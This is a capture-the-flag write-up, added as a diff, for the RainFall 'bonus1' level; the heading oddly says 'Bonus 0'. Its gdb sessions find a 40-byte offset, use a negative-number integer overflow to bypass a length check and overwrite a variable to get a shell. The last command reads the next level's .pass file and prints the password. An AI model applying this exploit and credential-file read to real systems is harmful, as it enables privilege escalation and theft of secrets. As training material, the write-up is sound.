@@ -1,0 +1,106 @@
+# Bonus 0
+
+## Analysis
+
+## Attack type: Buffer overflow
+
+```bash
+(gdb) r 1 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9
+Starting program: /home/user/bonus1/bonus1 1 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9
+
+Breakpoint 1, 0x08048478 in main ()
+(gdb) x/32x $esp
+0xbffff6a0:     0xbffff6b4      0xbffff8ca      0x00000004      0x080482fd
+0xbffff6b0:     0xb7fd13e4      0x41306141      0x08049764      0x080484d1
+0xbffff6c0:     0xffffffff      0xb7e5edc6      0xb7fd0ff4      0xb7e5ee55
+0xbffff6d0:     0xb7fed280      0x00000000      0x080484b9      0x00000001
+0xbffff6e0:     0x080484b0      0x00000000      0x00000000      0xb7e454d3
+0xbffff6f0:     0x00000003      0xbffff784      0xbffff794      0xb7fdc858
+0xbffff700:     0x00000000      0xbffff71c      0xbffff794      0x00000000
+0xbffff710:     0x0804821c      0xb7fd0ff4      0x00000000      0x00000000
+```
+
+```bash
+(gdb) r 9 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/user/bonus1/bonus1 9 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9
+
+Breakpoint 1, 0x08048478 in main ()
+(gdb) x/32x $esp
+0xbffff6a0:     0xbffff6b4      0xbffff8ca      0x00000024      0x080482fd
+0xbffff6b0:     0xb7fd13e4      0x41306141      0x61413161      0x33614132
+0xbffff6c0:     0x41346141      0x61413561      0x37614136      0x41386141
+0xbffff6d0:     0x62413961      0x31624130      0x080484b9      0x00000009
+0xbffff6e0:     0x080484b0      0x00000000      0x00000000      0xb7e454d3
+0xbffff6f0:     0x00000003      0xbffff784      0xbffff794      0xb7fdc858
+0xbffff700:     0x00000000      0xbffff71c      0xbffff794      0x00000000
+0xbffff710:     0x0804821c      0xb7fd0ff4      0x00000000      0x00000000
+```
+
+
+```bash
+(gdb) r -2147483630 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/user/bonus1/bonus1 -2147483630 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9
+
+Breakpoint 1, 0x08048478 in main ()
+(gdb) x/32x $esp
+0xbffff6a0:     0xbffff6b4      0xbffff8ca      0x00000048      0x080482fd
+0xbffff6b0:     0xb7fd13e4      0x41306141      0x61413161      0x33614132
+0xbffff6c0:     0x41346141      0x61413561      0x37614136      0x41386141
+0xbffff6d0:     0x62413961      0x31624130      0x41326241      0x62413362
+0xbffff6e0:     0x35624134      0x41366241      0x62413762      0x39624138
+0xbffff6f0:     0x52455400      0x74783d4d      0x2d6d7265      0xb7fdc858
+0xbffff700:     0x00000000      0xbffff71c      0xbffff794      0x00000000
+0xbffff710:     0x0804821c      0xb7fd0ff4      0x00000000      0x00000000
+```
+0x62413362 => offset 40
+
+
+```bash
+(gdb) r -2147483630 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/user/bonus1/bonus1 -2147483630 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9
+
+Breakpoint 1, 0x08048478 in main ()
+(gdb) x/32x $esp
+0xbffff6a0:     0xbffff6b4      0xbffff8ca      0x00000048      0x080482fd
+0xbffff6b0:     0xb7fd13e4      0x41306141      0x61413161      0x33614132
+0xbffff6c0:     0x41346141      0x61413561      0x37614136      0x41386141
+0xbffff6d0:     0x62413961      0x31624130      0x41326241      0x62413362
+0xbffff6e0:     0x35624134      0x41366241      0x62413762      0x39624138
+0xbffff6f0:     0x52455400      0x74783d4d      0x2d6d7265      0xb7fdc858
+0xbffff700:     0x00000000      0xbffff71c      0xbffff794      0x00000000
+0xbffff710:     0x0804821c      0xb7fd0ff4      0x00000000      0x00000000
+(gdb) ./bonus1 -2147483637 $(python -c 'print "B"*40 + "\x46\x4c\x4f\x57"')
+Undefined command: "".  Try "help".
+(gdb) r -2147483637 $(python -c 'print "B"*40 + "\x46\x4c\x4f\x57"')
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/user/bonus1/bonus1 -2147483637 $(python -c 'print "B"*40 + "\x46\x4c\x4f\x57"')
+
+Breakpoint 1, 0x08048478 in main ()
+(gdb) x/32x $esp
+0xbffff6b0:     0xbffff6c4      0xbffff8da      0x0000002c      0x080482fd
+0xbffff6c0:     0xb7fd13e4      0x42424242      0x42424242      0x42424242
+0xbffff6d0:     0x42424242      0x42424242      0x42424242      0x42424242
+0xbffff6e0:     0x42424242      0x42424242      0x42424242      0x574f4c46
+0xbffff6f0:     0x080484b0      0x00000000      0x00000000      0xb7e454d3
+0xbffff700:     0x00000003      0xbffff794      0xbffff7a4      0xb7fdc858
+0xbffff710:     0x00000000      0xbffff71c      0xbffff7a4      0x00000000
+0xbffff720:     0x0804821c      0xb7fd0ff4      0x00000000      0x00000000
+(gdb) c
+Continuing.
+process 25458 is executing new program: /bin/dash
+$ whoami
+bonus1
+```
+
+```bash
+bonus1@RainFall:~$ ./bonus1 -2147483637 $(python -c 'print "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB" + "\x46\x4c\x4f\x57"')
+$ cat /home/user/bonus2/.pass
+579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
+```
